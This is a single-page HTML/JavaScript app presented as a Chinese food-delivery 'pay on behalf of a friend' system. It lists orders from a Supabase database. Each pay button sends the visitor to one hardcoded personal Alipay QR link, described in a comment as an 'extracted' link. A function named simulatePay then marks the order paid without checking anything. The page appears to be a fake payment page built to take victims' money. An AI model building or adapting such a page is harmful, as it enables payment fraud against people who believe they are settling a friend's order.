<!doctype html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<title>外卖代付系统</title>
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
:root{ --bg:#f5f5f5; --primary:#ffd000; }
body{margin:0;font-family:sans-serif;background:var(--bg)}
.nav{display:flex;padding:10px;background:#fff;border-bottom:1px solid #eee;position:sticky;top:0;z-index:100}
.nav-item{padding:8px 15px;cursor:pointer;font-weight:bold}
.nav-item.active{color:#000;border-bottom:2px solid var(--primary)}
.tab-view{display:none;padding:15px}
.tab-view.active{display:block}
.card{background:#fff;border-radius:15px;padding:20px;margin-bottom:15px;box-shadow:0 2px 10px rgba(0,0,0,.05)}
.btn{width:100%;padding:15px;border:0;border-radius:25px;font-weight:bold;cursor:pointer;margin-top:10px}
.btn-primary{background:var(--primary);color:#000}
</style>
</head>
<body>

<div class="nav">
  <div class="nav-item active" data-tab="orders">📋 待代付订单</div>
</div>

<div id="orders" class="tab-view active">
  <div id="order-list">加载中...</div>
</div>

<script>
// 配置区域
const SUPABASE_URL = 'https://dzesfxynbljtkwsbhbvq.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR6ZXNmeHluYmxqdGt3c2JoYnZxIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODI2OTI1NjksImV4cCI6MjA5ODI2ODU2OX0.fcpHEdZUqNABHa1fZ0AJtkucwj-MYRPuSzDoQxkkLLk';
// 这里填入你提取出来的支付宝二维码链接
const MY_ALIPAY_LINK = 'https://qr.alipay.com/fkx14343tq2hks1lq1v2z99'; 

const client = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

async function fetchOrders() {
  const { data } = await client.from('orders').select('*').order('id', { ascending: false });
  const container = document.getElementById('order-list');
  
  if (!data || data.length === 0) {
    container.innerHTML = '<div class="card">暂无代付订单</div>';
    return;
  }

  container.innerHTML = data.map(order => `
    <div class="card">
      <div style="font-size:14px;color:#888;">需付款</div>
      <div style="font-size:28px;font-weight:bold;margin:10px 0;">¥${Number(order.total || 82.80).toFixed(2)}</div>
      <div style="background:#fff3bf;padding:10px;border-radius:8px;font-size:12px;margin-bottom:15px;">
        付款须知：<br>1. 代付订单创建后，请于15分钟内完成支付。<br>2. 支付后请点击下方按钮确认。
      </div>
      <a href="${MY_ALIPAY_LINK}" target="_blank">
        <button class="btn btn-primary">为好友买单</button>
      </a>
      <button class="btn" style="background:#eee" onclick="simulatePay(${order.id})">我已支付，点击确认</button>
    </div>
  `).join('');
}

async function simulatePay(id) {
  alert('支付验证中... 请确保您已完成支付宝转账。');
  await client.from('orders').update({ status: '已支付' }).eq('id', id);
  location.reload();
}

fetchOrders();
</script>
</body>
</html>
